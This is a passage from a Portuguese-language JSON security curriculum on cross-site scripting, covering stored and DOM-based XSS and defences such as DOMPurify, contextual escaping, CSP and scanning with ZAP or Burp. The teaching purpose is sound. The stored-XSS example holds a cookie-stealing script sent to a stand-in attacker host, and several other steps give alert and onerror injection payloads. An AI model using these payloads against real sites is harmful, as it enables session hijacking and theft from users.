                              "practicalExample": "Em um blog WordPress vulnerável, um atacante posta um comentário: '<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>'. O comentário é salvo no banco MySQL sem sanitização. Quando qualquer usuário visita a página do post, o script executa, enviando cookies de sessão para o servidor do atacante, permitindo hijack de contas para todos os leitores.",
                              "finalVerifications": [
                                "Defina XSS Armazenado em 1 frase precisa.",
                                "Descreva o fluxo completo de 4 etapas.",
                                "Liste 3 vetores comuns e 1 payload para cada.",
                                "Diferencie de XSS Refletido em 3 pontos chave.",
                                "Explique por que é considerado de alto impacto.",
                                "Identifique 2 mitigações básicas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e características (20%)",
                                "Clareza no diagrama de fluxo e vetores (25%)",
                                "Profundidade em payloads e impactos (20%)",
                                "Comparação efetiva com outros XSS (20%)",
                                "Uso correto de terminologia técnica (10%)",
                                "Estrutura lógica e completude (5%)"
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Sanitização de inputs em HTML/JS/PHP.",
                                "Banco de Dados: Armazenamento seguro de dados user-generated.",
                                "Ética e Direito: Regulamentações como GDPR para breaches de dados.",
                                "Redes e Sistemas: Análise de tráfego para detecção de exfiltração.",
                                "Programação: Encoding de output com bibliotecas como OWASP ESAPI."
                              ],
                              "realWorldApplication": "Em plataformas como fóruns (ex: antigo MySpace Samy Worm, que infectou 1M+ usuários via XSS Stored em perfis), redes sociais ou sistemas de tickets (ex: Jira vulnerabilidades históricas), onde comentários ou campos persistentes permitem roubo em massa de credenciais, defacement coletivo ou propagação de malware."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.1.1"
                            ]
                          },
                          {
                            "id": "10.1.4.2.2.3",
                            "name": "Caracterizar XSS Baseado em DOM",
                            "description": "Analisar como manipulações client-side no DOM permitem injeção sem interação server-side, usando exemplos com document.write e innerHTML.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Conceitos Básicos do DOM e XSS Baseado em DOM",
                                  "subSteps": [
                                    "Estude o Document Object Model (DOM) como uma interface de programação para documentos HTML e XML.",
                                    "Revise os tipos de XSS: Stored, Reflected e DOM-based.",
                                    "Defina DOM-based XSS como um ataque que ocorre inteiramente no lado do cliente, manipulando o DOM via JavaScript.",
                                    "Explique que não há interação com o servidor após o carregamento inicial da página.",
                                    "Identifique fontes de input perigosas como location.search, location.hash e document.referrer."
                                  ],
                                  "verification": "Escreva um parágrafo resumindo DOM-based XSS em suas próprias palavras, destacando sua natureza client-side.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs sobre DOM",
                                    "OWASP Cheat Sheet para XSS Prevention",
                                    "Vídeo introdutório sobre tipos de XSS (YouTube ou PortSwigger Academy)"
                                  ],
                                  "tips": "Visualize o DOM como uma árvore: manipulações em nós podem injetar código malicioso sem recarregar a página.",
                                  "learningObjective": "Compreender os fundamentos do DOM e diferenciar DOM-based XSS de outros tipos.",
                                  "commonMistakes": [
                                    "Confundir DOM-based XSS com Reflected XSS (que envolve servidor).",
                                    "Ignorar que o ataque usa sinks como document.write sem validação."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Exemplos de Vulnerabilidades com document.write",
                                  "subSteps": [
                                    "Examine código vulnerável: document.write(location.hash.slice(1)).",
                                    "Simule um ataque: URL com #<script>alert('XSS')</script>.",
                                    "Observe como o browser interpreta e executa o script injetado diretamente no DOM.",
                                    "Teste em um ambiente local para ver o payload sendo renderizado.",
                                    "Registre o fluxo: source (URL) -> sink (document.write) sem sanitização."
                                  ],
                                  "verification": "Crie e execute um PoC local que demonstre a injeção via document.write e capture uma screenshot do alert.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor de código como VS Code",
                                    "Browser com DevTools (Chrome/Firefox)",
                                    "Servidor local simples (Live Server extension ou Python http.server)"
                                  ],
                                  "tips": "Use DevTools para inspecionar o DOM após a injeção e ver o script sendo adicionado dinamicamente.",
                                  "learningObjective": "Identificar e reproduzir ataques DOM-based XSS usando document.write.",
                                  "commonMistakes": [
                                    "Esquecer de codificar o hash corretamente no teste.",
                                    "Não isolar o teste em um ambiente sandbox para evitar riscos reais."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Vulnerabilidades com innerHTML e Outros Sinks",
                                  "subSteps": [
                                    "Analise código como element.innerHTML = location.search.slice(1).",
                                    "Construa um PoC: parameter ?payload=<img src=x onerror=alert(1)>.",
                                    "Compare sinks: innerHTML parseia HTML, permitindo tags e scripts.",
                                    "Teste variações com outerHTML, write e eval.",
                                    "Documente o parsing client-side que leva à execução de scripts."
                                  ],
                                  "verification": "Desenvolva um segundo PoC com innerHTML, execute e explique o mecanismo em um relatório curto.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Mesmo setup do Step 2",
                                    "PortSwigger Web Security Academy labs para DOM XSS",
                                    "Ferramenta Burp Suite Community (opcional para interceptar)"
                                  ],
                                  "tips": "Lembre-se: innerHTML é mais perigoso que textContent, pois interpreta HTML.",
                                  "learningObjective": "Dominar sinks comuns como innerHTML e caracterizar o fluxo de ataque client-side.",
                                  "commonMistakes": [
                                    "Usar textContent em vez de innerHTML no teste (não executa JS).",
                                    "Não considerar contextos como event handlers em atributos."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Caracterizar Diferenças, Detecção e Prevenção",
                                  "subSteps": [
                                    "Compare DOM-based XSS com outros: sem server reflection, detectado só client-side.",
                                    "Liste ferramentas de detecção: DOMPurify, linters JS, scanners como XSStrike.",
                                    "Discuta mitigações: validar/sanitizar inputs, usar textContent, CSP.",
                                    "Simule detecção em DevTools rastreando sources e sinks.",
                                    "Resuma características chave: puramente client-side, comum em SPAs."
                                  ],
                                  "verification": "Crie um fluxograma do ataque DOM XSS e liste 3 mitigações específicas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Papel ou ferramenta de diagrama (Draw.io)",
                                    "Documentação DOMPurify",
                                    "OWASP DOM-based XSS Prevention Cheat Sheet"
                                  ],
                                  "tips": "Mapeie todos os sources/sinks no código para auditoria rápida.",
                                  "learningObjective": "Caracterizar completamente DOM-based XSS e propor defesas.",
                                  "commonMistakes": [
                                    "Recomendar soluções server-side para um problema client-side.",
                                    "Subestimar a prevalência em apps single-page (React/Vue/Angular)."
                                  ]
                                }
                              ],
                              "practicalExample": "Crie uma página HTML com: <script>document.write(location.search.slice(1))</script>. Acesse ?<script>alert('DOM XSS!')</script> – o script injetado executa no browser sem qualquer request ao servidor, demonstrando manipulação client-side pura do DOM.",
                              "finalVerifications": [
                                "Explicar verbalmente ou por escrito o fluxo source-sink em DOM XSS.",
                                "Identificar 2 exemplos de código vulnerável e propor fixes.",
                                "Simular um ataque em PoC e gravar vídeo de 1 minuto.",
                                "Diferenciar DOM XSS de Reflected/Stored em tabela comparativa.",
                                "Listar 3 sinks comuns e seus riscos.",
                                "Aplicar sanitização em um código dado e testar."
                              ],
                              "assessmentCriteria": [
                                "Precisão na definição e caracterização de DOM-based XSS (sem confusão com outros tipos).",
                                "Qualidade dos PoCs: reproduzíveis, com screenshots e explicações claras.",
                                "Profundidade nos exemplos: cobertura de document.write e innerHTML.",
                                "Compreensão de mitigações client-side específicas.",
                                "Criatividade em fluxogramas ou diagramas de ataque.",
                                "Identificação correta de common mistakes e tips aplicados."
                              ],
                              "crossCurricularConnections": [
                                "Programação JavaScript: manipulação avançada do DOM.",
                                "Desenvolvimento Web: segurança em front-end e SPAs.",
                                "Ética e Direito Digital: impactos de vulnerabilidades em privacidade.",
                                "Análise de Malware: similaridades com injeções em browsers.",
                                "Engenharia de Software: code review e secure coding practices."
                              ],
                              "realWorldApplication": "Em aplicações single-page como dashboards bancários (ex: Angular apps), URLs manipuladas por atacantes via phishing podem injetar scripts para roubo de sessões ou dados, sem logs server-side – essencial para auditores de segurança em fintechs e e-commerces detectarem essas falhas em pentests."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.4.2.3",
                        "name": "Mitigações e Prevenção de XSS",
                        "description": "Aplicar técnicas de defesa contra XSS, incluindo validação de entradas, escaping de saídas e políticas de segurança no navegador.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.2.3.1",
                            "name": "Implementar validação e sanitização de inputs",
                            "description": "Usar bibliotecas como DOMPurify ou filtros regex para remover scripts maliciosos de entradas de usuários antes do processamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e instalar DOMPurify",
                                  "subSteps": [
                                    "Criar um projeto HTML básico com um formulário de entrada de usuário.",
                                    "Incluir o CDN do DOMPurify no cabeçalho do HTML.",
                                    "Testar a carga da biblioteca abrindo o console do navegador e verificando se DOMPurify está disponível.",
                                    "Configurar um script JavaScript para capturar eventos de input do formulário.",
                                    "Adicionar um elemento de saída para exibir o input sanitizado."
                                  ],
                                  "verification": "Console do navegador mostra DOMPurify sem erros e o formulário carrega corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Navegador web com console dev tools",
                                    "CDN DOMPurify: https://cdn.jsdelivr.net/npm/dompurify@3.1.6/dist/purify.min.js"
                                  ],
                                  "tips": "Use sempre a versão mais recente do DOMPurify para patches de segurança atualizados.",
                                  "learningObjective": "Entender como integrar DOMPurify em uma aplicação web frontend.",
                                  "commonMistakes": [
                                    "Esquecer de carregar a biblioteca antes de usá-la",
                                    "Usar HTTP em vez de HTTPS para CDN em produção"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar sanitização básica com DOMPurify",
                                  "subSteps": [
                                    "Capturar o valor do input de usuário em um evento 'input' ou 'submit'.",
                                    "Aplicar DOMPurify.sanitize(inputValue, { ALLOWED_TAGS: ['b', 'i', 'u'] }) para permitir apenas tags seguras.",
                                    "Inserir o resultado sanitizado em um elemento DOM seguro, como innerHTML.",
                                    "Adicionar feedback visual mostrando input original vs. sanitizado.",
                                    "Testar com input simples como '<b>texto</b>' para verificar preservação."
                                  ],
                                  "verification": "Input com tags permitidas é preservado; tags não permitidas são removidas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Código HTML/JS do Step 1",
                                    "Documentação DOMPurify: https://github.com/cure53/DOMPurify"
                                  ],
                                  "tips": "Configure ALLOWED_TAGS conforme o contexto da aplicação para evitar sub-sanitização.",
                                  "learningObjective": "Aplicar DOMPurify para neutralizar payloads XSS em inputs de usuário.",
                                  "commonMistakes": [
                                    "Usar textContent em vez de innerHTML após sanitização (perde formatação)",
                                    "Não especificar config, permitindo todas as tags por default"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Adicionar validação com expressões regulares (regex)",
                                  "subSteps": [
                                    "Definir padrões regex para validar formatos esperados, ex: /^[^<>\"']+$/ para texto simples.",
                                    "Combinar regex com DOMPurify: primeiro validar, depois sanitizar.",
                                    "Implementar função que rejeita inputs inválidos e exibe erro.",
                                    "Testar regex com casos edge como emails, URLs e texto com caracteres especiais.",
                                    "Atualizar o formulário para processar apenas inputs válidos."
                                  ],
                                  "verification": "Inputs inválidos são rejeitados antes da sanitização; válidos passam para DOMPurify.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Regex101.com para testar padrões",
                                    "Referência MDN: RegExp"
                                  ],
                                  "tips": "Use regex flags como 'i' para case-insensitive quando apropriado, mas evite regex complexas para performance.",
                                  "learningObjective": "Integrar validação regex como camada extra de defesa contra injeções maliciosas.",
                                  "commonMistakes": [
                                    "Regex muito permissiva permitindo '<script>'",
                                    "Não escapar caracteres especiais em regex"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e integrar validação server-side",
                                  "subSteps": [
                                    "Enviar input sanitizado via fetch/AJAX para um endpoint server simples (Node.js/Express).",
                                    "Implementar sanitização equivalente no servidor usando bibliotecas como validator.js.",
                                    "Simular ataques XSS injetando '<script>alert(\"XSS\")</script>' e verificar bloqueio.",
                                    "Usar ferramentas como OWASP ZAP ou browser dev tools para inspecionar tráfego.",
                                    "Documentar o fluxo completo client-server em comentários no código."
                                  ],
                                  "verification": "Ataques simulados não executam; logs server mostram inputs limpos.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Node.js e Express para server mock",
                                    "OWASP XSS Cheat Sheet",
                                    "validator.js npm package"
                                  ],
                                  "tips": "Sempre sanitize no server independentemente do client, pois client pode ser burlado.",
                                  "learningObjective": "Garantir defesa em profundidade com sanitização client e server-side.",
                                  "commonMistakes": [
                                    "Confiar apenas em client-side",
                                    "Não testar com payloads obfuscados como 'jav&#x0D;ascript:'"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um formulário de comentários de blog, capture o texto do usuário, valide com regex para comprimento e caracteres, sanitize com DOMPurify permitindo apenas <strong> e <em>, envie para server que re-sanitiza e salva no banco. Teste injetando <script>alert('XSS')</script> – deve salvar como texto plano sem executar.",
                              "finalVerifications": [
                                "DOMPurify remove tags/script maliciosos de inputs HTML.",
                                "Regex rejeita inputs com padrões inválidos antes da sanitização.",
                                "Server-side sanitização processa inputs client-side limpos corretamente.",
                                "Testes manuais com cheat sheet XSS não disparam alerts.",
                                "Performance: sanitização em <100ms para inputs de 1KB.",
                                "Logs mostram rejeições de inputs maliciosos."
                              ],
                              "assessmentCriteria": [
                                "Código usa DOMPurify com configuração explícita de tags permitidas.",
                                "Validação regex é aplicada antes da sanitização com padrões apropriados.",
                                "Integração client-server demonstra defense-in-depth.",
                                "Testes cobrem 5+ payloads XSS comuns (refletido, armazenado).",
                                "Código é legível com comentários explicando escolhas de segurança.",
                                "Nenhum erro de console ou vulnerabilidade em scans básicos."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web (JavaScript frontend/backend)",
                                "Desenvolvimento de Software Seguro (OWASP Top 10)",
                                "Testes de Software (unit tests para sanitização)",
                                "Redes e Sistemas (compreensão de HTTP e payloads)",
                                "Ética em TI (prevenção de breaches de dados)"
                              ],
                              "realWorldApplication": "Em plataformas como redes sociais (ex: Twitter/X) ou fóruns (Reddit), sanitização previne que usuários injetem scripts que roubem cookies/sessões, protegendo milhões de usuários contra roubo de dados e defacement de sites."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.2.3.2",
                            "name": "Aplicar escaping contextual de saídas",
                            "description": "Escapar caracteres especiais em diferentes contextos (HTML, JavaScript, CSS, URL) usando funções como htmlspecialchars em PHP ou encodeURIComponent em JS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Contextos de Saída e Riscos de XSS",
                                  "subSteps": [
                                    "Identifique os quatro contextos principais: HTML body, JavaScript string, CSS value e URL query parameter.",
                                    "Analise exemplos de payloads maliciosos para cada contexto, como '<script>alert(1)</script>' em HTML.",
                                    "Estude por que escaping genérico falha: htmlspecialchars não escapa / em JS contexts.",
                                    "Crie um diagrama mental mapeando contextos a funções de escaping corretas.",
                                    "Revise OWASP XSS Prevention Cheat Sheet para validação conceitual."
                                  ],
                                  "verification": "Crie um mapa conceitual com 4 contextos e 1 payload malicioso por contexto; valide com OWASP.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "OWASP XSS Prevention Cheat Sheet, diagrama em papel ou ferramenta como Draw.io",
                                  "tips": "Sempre pergunte: 'Onde esta saída é injetada?' antes de escolher a função.",
                                  "learningObjective": "Diferenciar contextos de saída e associar riscos específicos de XSS a cada um.",
                                  "commonMistakes": "Confundir contexto HTML com JS; usar escaping universal sem considerar o contexto."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar Funções de Escaping por Contexto",
                                  "subSteps": [
                                    "Em PHP: Pratique htmlspecialchars() para HTML body, json_encode() para JS, urlencode() para URL.",
                                    "Em JS: Use encodeURIComponent() para URL/JS, textContent ou innerText para HTML, CSS.escape() para CSS.",
                                    "Compare funções: Teste htmlspecialchars vs. htmlentities em payloads com aspas duplas.",
                                    "Implemente uma tabela de referência: Contexto | Linguagem | Função | Flags opcionais.",
                                    "Memorize regras: Nunca use htmlspecialchars em JS ou URL sem adaptação."
                                  ],
                                  "verification": "Escreva uma tabela com 4 contextos, funções PHP/JS e teste com 1 payload por linha.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Documentação PHP (htmlspecialchars), MDN Web Docs (encodeURIComponent), editor de código como VS Code",
                                  "tips": "Use flags como ENT_QUOTES em PHP para máxima cobertura em HTML.",
                                  "learningObjective": "Selecionar e aplicar a função de escaping correta para cada contexto e linguagem.",
                                  "commonMistakes": "Usar htmlspecialchars() em atributos HTML com aspas simples; esquecer de escapar quebras de linha em JS."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Escaping Contextual em Código Real",
                                  "subSteps": [
                                    "Crie um formulário PHP/JS simples com input usuário: exiba em HTML, insira em <script>, CSS e URL.",
                                    "Aplique escaping: htmlspecialchars($input, ENT_QUOTES) no HTML, json_encode no JS, etc.",
                                    "Refatore código vulnerável: Converta echo $userInput para echo htmlspecialchars($userInput).",
                                    "Adicione Content Security Policy (CSP) como camada extra, mas foque em escaping.",
                                    "Teste manualmente injetando payloads em cada contexto."
                                  ],
                                  "verification": "Execute o código com 4 payloads maliciosos; confirme que nenhum alerta ou execução ocorre.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Servidor local (XAMPP ou Node.js), browser dev tools, payloads XSS de teste (ex: XSStrike lista)",
                                  "tips": "Sempre escape próximo ao ponto de saída, não no input.",
                                  "learningObjective": "Integrar escaping contextual em fluxos de código web dinâmico.",
                                  "commonMistakes": "Escapar input em vez de output; reutilizar função errada entre contextos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar Contra Ataques XSS",
                                  "subSteps": [
                                    "Use ferramentas: Burp Suite ou browser console para fuzzing com payloads XSS.",
                                    "Simule reflected/stored XSS em cada contexto e verifique bloqueio.",
                                    "Automatize testes com unit tests: Assert que saída escapada não contém <script> executável.",
                                    "Audite código: Procure por echo/print sem escaping em templates.",
                                    "Documente lições: Registre 3 cenários onde falhou inicialmente."
                                  ],
                                  "verification": "Gere relatório com 8 testes (2 por contexto, PHP/JS) mostrando 'Vulnerável' -> 'Mitigado'.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Burp Suite Community, PHPUnit/Jest para testes, lista de payloads XSS (PortSwigger)",
                                  "tips": "Combine escaping com validação input e CSP para defesa em profundidade.",
                                  "learningObjective": "Validar implementações de escaping através de testes automatizados e manuais.",
                                  "commonMistakes": "Ignorar contextos aninhados como URL dentro de JS; confiar só em testes manuais."
                                }
                              ],
                              "practicalExample": "Em um blog PHP: Usuário submete comentário '<script>alert(\"XSS\")</script>'. Sem escaping: executa no HTML. Com htmlspecialchars(ENT_QUOTES) no echo do body, falha. No <script>alert('$user')</script>, use json_encode($user) para: alert(\"<script>...\"). Em URL: ?search=' + encodeURIComponent(userInput).",
                              "finalVerifications": [
                                "Identifica corretamente o contexto de saída em 4 cenários dados.",
                                "Seleciona função apropriada (ex: não usa htmlspecialchars em JS) em quiz de 5 perguntas.",
                                "Implementa escaping em código fornecido sem erros em revisão.",
                                "Testa e mitiga XSS em app demo com 100% sucesso.",
                                "Explica diferenças entre contextos em entrevista simulada.",
                                "Cria tabela de referência pessoal precisa."
                              ],
                              "assessmentCriteria": [
                                "Precisão na escolha de funções por contexto (90%+ correto).",
                                "Cobertura completa de sub-passos em implementações (todos 3-5+).",
                                "Código refatorado livre de vulnerabilidades XSS detectáveis.",
                                "Relatórios de teste incluem evidências (screenshots/logs).",
                                "Compreensão demonstrada em explicações orais/escritas.",
                                "Tempo respeitado com qualidade alta."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Integra com DOM manipulation em JS/HTML/CSS.",
                                "Matemática/Algoritmos: Entende encoding como transformações de strings (base64 similar).",
                                "Ética/Lei: Relaciona a conformidade GDPR/ LGPD via proteção de dados usuários.",
                                "Desenvolvimento de Software: Práticas de secure coding (OWASP Top 10)."
                              ],
                              "realWorldApplication": "Em e-commerces como Magazine Luiza, escaping previne XSS em comentários/produtos, evitando roubo de sessões/carrinhos; em bancos digitais, protege saldos contra injeções em dashboards personalizados."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.1.3"
                            ]
                          },
                          {
                            "id": "10.1.4.2.3.3",
                            "name": "Configurar Content Security Policy (CSP)",
                            "description": "Definir headers CSP para restringir fontes de scripts, inline e eval, prevenindo execução de código injetado não autorizado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Fundamentais do CSP",
                                  "subSteps": [
                                    "Estude as diretivas principais do CSP: default-src, script-src, style-src, img-src e object-src.",
                                    "Aprenda sobre fontes de conteúdo: none, self, unsafe-inline, unsafe-eval e URLs específicas.",
                                    "Entenda mecanismos de prevenção de XSS: nonces, hashes e strict-dynamic.",
                                    "Revise exemplos de políticas CSP comuns para sites web.",
                                    "Analise violações reportadas via report-uri/report-to."
                                  ],
                                  "verification": "Resuma em um documento as 5 diretivas principais e dê exemplos de uso para cada uma.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial MDN Web Docs sobre CSP",
                                    "Exemplos de políticas CSP no OWASP Cheat Sheet"
                                  ],
                                  "tips": "Comece com default-src * como fallback, mas restrinja progressivamente para maior segurança.",
                                  "learningObjective": "Identificar e explicar todas as diretivas CSP essenciais e seus impactos na prevenção de XSS.",
                                  "commonMistakes": [
                                    "Confundir unsafe-inline com self",
                                    "Ignorar report-uri para depuração",
                                    "Não considerar inline scripts legítimos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar CSP Básico via Header HTTP",
                                  "subSteps": [
                                    "Configure um servidor web local (Apache/Nginx) ou use um framework como Express.js.",
                                    "Adicione o header Content-Security-Policy no response: Content-Security-Policy: default-src 'self'; script-src 'self'.",
                                    "Teste com uma página HTML simples contendo scripts inline e externos.",
                                    "Verifique o header no DevTools do navegador (Network tab).",
                                    "Ajuste para bloquear eval() com 'unsafe-eval' ausente."
                                  ],
                                  "verification": "Carregue uma página com script inline malicioso e confirme que é bloqueado no console do navegador.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Servidor local (XAMPP ou Node.js/Express)",
                                    "Editor de código (VS Code)",
                                    "Navegador com DevTools"
                                  ],
                                  "tips": "Use Content-Security-Policy-Report-Only no início para testar sem bloquear.",
                                  "learningObjective": "Implementar e validar um header CSP básico que restrinja scripts a fontes confiáveis.",
                                  "commonMistakes": [
                                    "Esquecer aspas simples em nonces/hashes",
                                    "Não recarregar o servidor após configuração",
                                    "Configurar apenas via meta tag sem header"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Diretivas Avançadas para Mitigação de XSS",
                                  "subSteps": [
                                    "Gere nonces dinâmicos para scripts inline: crypto.getRandomValues().",
                                    "Configure hashes SHA256/512 para scripts/style específicos.",
                                    "Adicione script-src 'nonce-{random}' e style-src 'sha256-{hash}'.",
                                    "Inclua report-to para enviar violações a um endpoint de log.",
                                    "Teste com payloads XSS comuns (ex: <script>alert(1)</script>)."
                                  ],
                                  "verification": "Insira um nonce incorreto em um script e confirme bloqueio; teste hash válido/inválido.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Biblioteca crypto para JS (navegador ou Node)",
                                    "Ferramenta online para gerar hashes SHA (ex: cyberchef)",
                                    "Endpoint de relatório simples (ex: webhook.site)"
                                  ],
                                  "tips": "Nonces devem ser únicos por request; hashes por conteúdo exato, incluindo quebras de linha.",
                                  "learningObjective": "Aplicar nonces e hashes para permitir apenas código autorizado, fortalecendo defesa contra injeções.",
                                  "commonMistakes": [
                                    "Reutilizar nonces estáticos",
                                    "Calcular hash incorreto (case-sensitive/base64)",
                                    "Não escapar caracteres especiais no report-uri"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Validar e Monitorar a Configuração CSP",
                                  "subSteps": [
                                    "Use ferramentas como CSP Evaluator (csp-evaluator.withgoogle.com) para analisar sua política.",
                                    "Simule ataques XSS com payloads variados e verifique logs de console/relatórios.",
                                    "Monitore violações com report-to e ajuste políticas iterativamente.",
                                    "Teste compatibilidade cross-browser (Chrome, Firefox, Safari).",
                                    "Documente a política final e crie um plano de manutenção."
                                  ],
                                  "verification": "Gere relatório de CSP sem erros e confirme zero violações em testes de penetração simulados.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "CSP Evaluator tool",
                                    "Burp Suite Community ou OWASP ZAP para testes XSS",
                                    "Logs de servidor/navegador"
                                  ],
                                  "tips": "Priorize políticas restritivas, mas funcioneis; use frame-ancestors para CSP infantil.",
                                  "learningObjective": "Validar efetividade da CSP contra XSS e estabelecer monitoramento contínuo.",
                                  "commonMistakes": [
                                    "Ignorar violações reportadas",
                                    "Não testar em produção-like ambiente",
                                    "Sobrecarregar com diretivas desnecessárias"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um site de e-commerce, configure CSP com script-src 'self' 'nonce-{random}' https://trusted.cdn.com; teste injetando <script>alert('XSS')</script> em um campo de busca, confirmando bloqueio e log de violação.",
                              "finalVerifications": [
                                "Política CSP é aplicada via header em todas as páginas.",
                                "Scripts inline sem nonce/hash são bloqueados.",
                                "Eval() e inline maliciosos falham silenciosamente.",
                                "Relatórios de violação são enviados corretamente.",
                                "Compatibilidade com browsers principais sem quebras.",
                                "Ferramentas de avaliação dão nota A ou superior."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de diretivas (sem erros de sintaxe).",
                                "Eficácia contra 5+ payloads XSS variados.",
                                "Uso correto de nonces/hashes dinâmicos.",
                                "Inclusão de monitoramento/reporting.",
                                "Documentação clara da política e testes.",
                                "Tempo de implementação dentro do estimado."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Web: Integração com HTML/JS para nonces.",
                                "Redes e Servidores: Configuração de headers em Apache/Nginx.",
                                "Análise de Logs: Processamento de relatórios CSP para forensics.",
                                "Ética em Cibersegurança: Balanceamento de segurança vs usabilidade."
                              ],
                              "realWorldApplication": "Em aplicações bancárias online, CSP previne roubo de sessões via XSS, protegendo dados sensíveis como números de cartão e credenciais de login contra ataques em formulários ou anúncios maliciosos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.2.2.3"
                            ]
                          },
                          {
                            "id": "10.1.4.2.3.4",
                            "name": "Testar aplicações para XSS com ferramentas OWASP",
                            "description": "Utilizar ZAP ou Burp Suite para escanear e validar vulnerabilidades XSS em aplicações web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar OWASP ZAP ou Burp Suite",
                                  "subSteps": [
                                    "Baixar a versão mais recente do OWASP ZAP do site oficial (https://www.zaproxy.org/) ou Burp Suite Community Edition de https://portswigger.net/burp.",
                                    "Instalar em um ambiente isolado como máquina virtual (ex: VirtualBox com Kali Linux) para evitar riscos de segurança.",
                                    "Executar a ferramenta e configurar como proxy HTTP padrão na porta 8080.",
                                    "Instalar certificados raiz personalizados (Root CA) para interceptar tráfego HTTPS sem erros de certificado.",
                                    "Habilitar add-ons essenciais no ZAP como Active Scanner e AJAX Spider, ou no Burp, o Scanner básico."
                                  ],
                                  "verification": "Ferramenta inicia sem erros, proxy configurado no navegador (verifique acessando http://zap/ ou burp UI), e certificado importado no browser.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Computador com 8GB RAM",
                                    "VirtualBox ou VMWare",
                                    "Navegador Firefox/Chrome",
                                    "Download oficial ZAP/Burp"
                                  ],
                                  "tips": [
                                    "Use modo 'Safe' no ZAP inicialmente para evitar scans agressivos.",
                                    "Salve configurações em um perfil dedicado para testes XSS."
                                  ],
                                  "learningObjective": "Preparar um ambiente de teste seguro e funcional para análise de segurança web.",
                                  "commonMistakes": [
                                    "Instalar em máquina principal sem isolamento, expondo o host a malwares.",
                                    "Esquecer de importar o certificado CA, impedindo interceptação HTTPS.",
                                    "Usar portas em uso, causando conflitos de proxy."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Proxy no Navegador e Interceptar Tráfego da Aplicação Alvo",
                                  "subSteps": [
                                    "Configurar o navegador para usar proxy manual: localhost:8080 para HTTP/HTTPS.",
                                    "Desabilitar outros proxies ou VPNs que possam interferir.",
                                    "Navegar pela aplicação web alvo (ex: DVWA ou app local vulnerável) e capturar requests/responses.",
                                    "Interceptar e examinar payloads em formulários, URLs e parâmetros GET/POST suscetíveis a XSS.",
                                    "Mapear o site completo usando o Spider ou Crawler da ferramenta."
                                  ],
                                  "verification": "Tráfego da app é interceptado corretamente no History/Proxy tab, com requests/responses visíveis e sem erros de conexão.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Navegador configurado",
                                    "Aplicação vulnerável como DVWA (instalada via XAMPP)",
                                    "ZAP/Burp rodando"
                                  ],
                                  "tips": [
                                    "Use FoxyProxy extension para alternar proxy facilmente.",
                                    "Registre todos os endpoints em um arquivo para referência."
                                  ],
                                  "learningObjective": "Dominar interceptação de tráfego para identificar pontos de injeção XSS.",
                                  "commonMistakes": [
